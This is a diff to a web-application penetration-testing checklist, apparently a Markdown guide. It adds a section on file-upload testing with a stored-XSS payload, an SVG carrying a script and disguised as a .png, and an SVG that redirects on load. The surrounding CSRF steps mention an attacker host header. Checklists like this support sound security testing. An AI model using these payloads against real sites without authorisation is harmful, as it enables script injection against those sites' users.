@@ -595,7 +595,7 @@ X-Forwarded-Host: attacker-website.com
 - Remove any `Content-Type` headers if present.
 - Replay the request and check if the server executes the action.
 
-** 8. Switching Content Types**
+**8. Switching Content Types**
 - Intercept a JSON or URL-encoded request containing a CSRF token.
 - Modify the `Content-Type` header to `multipart/form-data`.
 - Replay the request and observe whether the server processes the altered request.
@@ -604,11 +604,50 @@ X-Forwarded-Host: attacker-website.com
 - [OWASP CSRF Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
 - [Burp Suite CSRF Testing Guide](https://portswigger.net/web-security/csrf)
 
+## File Upload Functionality Vulnerability Testing 
 
+**1. Stored XSS via File Upload**
+- Go to the target application.
+- Find the file upload functionality on the website.
+- Upload a CSV file or any file extension containing the payload `"><img src=xx onerror=alert(document.domain)>`
+- Verify if the XSS payload triggers the alert, indicating a successful injection.
 
+**2. Stored XSS via File Upload**
+- Go to the target application.
+- Find the file upload functionality on the website.
+- Upload a file named payloads containing the payload: `"><img src=xx onerror=alert(document.domain)>`
+- Verify if the XSS payload triggers the alert, indicating a successful injection.
 
+**3. File Upload Via XSS!**
+- Go to the target application.
+- Find the file upload functionality on the website.
+- Rename an SVG file containing the following malicious payload to malicious.png
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+  <script type="text/javascript">
+    alert("XSS by Suresh");
+  </script>
+</svg>
+```
+- Upload the renamed file (malicious.png) via the file upload functionality.
+- Access the uploaded file URL.
+- Observe that the JavaScript executes in the browser, showing the alert XSS by Suresh.
 
-
-
+**4. File Upload Via Open Redirection!**
+- Go to the target application.
+- Find the file upload functionality on the website.
+- Rename an SVG file containing the following payload to redirect.png
+```
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg" onload="window.location='https://google.com'">
+  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+</svg>
+```
+- Upload the renamed file (redirect.png) via the file upload functionality.
+- Access the uploaded file URL.
+- Observe that the browser redirects to https://google.com.
 
 
